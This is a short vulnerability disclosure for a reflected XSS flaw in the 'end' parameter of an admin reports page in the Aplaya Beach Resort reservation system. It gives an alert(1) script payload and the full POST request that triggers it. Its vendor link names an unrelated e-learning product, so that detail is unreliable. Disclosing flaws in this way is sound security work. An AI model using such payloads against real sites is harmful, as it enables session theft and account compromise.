Vulnerability discovery author:Qianyongcun

Aplaya Beach Resort Online Reservation System – reflected XSS on (admin/mod_reports/index.php end parameter) 

Vendor Homepage:
https://www.sourcecodester.com/php/14787/elearning-system-using-phpmysqli-source-code.html 

Version:V1.0
Tested on: PHP, Apache, MySQL

Affected Page:
admin/mod_reports/index.php 
On this page,end parameter is vulnerable to reflected XSS Attack 
Proof of vulnerability:
Visit this page：http://localhost/aplaya/admin/mod_reports/index.php 

Payload：
“><script>alert(1)</script>
Request with payload:
POST /aplaya/admin/mod_reports/index.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 89
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=g883r0l08f296hfd9582abk9v0
Origin: http://localhost
Referer: http://localhost/aplaya/admin/mod_reports/index.php
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

categ=Checkedout&end="><script>alert(1)</script>&start=2024-04-04&submit=

<img width="416" alt="image" src="https://github.com/qqqyc/vlun1/assets/53200267/596aa3ce-1c74-4c05-8f4d-3f304b764039">

Click Submit button-Trigger popup：

<img width="416" alt="image" src="https://github.com/qqqyc/vlun1/assets/53200267/8421fe1d-d24a-4bc2-a581-4b27eba8dc06">

